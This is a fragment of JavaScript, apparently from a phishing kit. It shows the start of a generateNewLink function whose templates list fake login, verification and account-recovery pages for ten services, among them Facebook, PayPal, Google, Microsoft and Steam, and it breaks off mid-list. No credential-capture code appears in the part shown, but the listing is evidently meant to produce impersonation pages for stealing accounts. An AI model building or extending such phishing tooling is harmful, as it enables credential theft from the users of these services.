...
function generateNewLink() {
    const templates = [
        { name: 'Facebook', icon: 'fab fa-facebook', desc: 'Facebook login page', file: 'facebook' },
        { name: 'Netflix', icon: 'fas fa-film', desc: 'Netflix login page', file: 'netflix' },
        { name: 'PayPal', icon: 'fab fa-paypal', desc: 'PayPal verification page', file: 'paypal' },
        { name: 'Google', icon: 'fab fa-google', desc: 'Google account recovery', file: 'google' },
        { name: 'Microsoft', icon: 'fab fa-microsoft', desc: 'Microsoft account sign-in', file: 'microsoft' },
        { name: 'Instagram', icon: 'fab fa-instagram', desc: 'Instagram login page', file: 'instagram' },
        { name: 'Discord', icon: 'fab fa-discord', desc: 'Discord verification', file: 'discord' },
        { name: 'Steam', icon: 'fab fa-steam', desc: 'Steam account sign-in', file: 'steam' },
        { name: 'Spotify', icon: 'fab fa-spotify', desc: 'Spotify login page', file: 'spotify' },
        { name: 'Twitter/X', icon: 'fab fa-twitter', desc: 'Twitter/X sign-in page', file: 'twitter' },
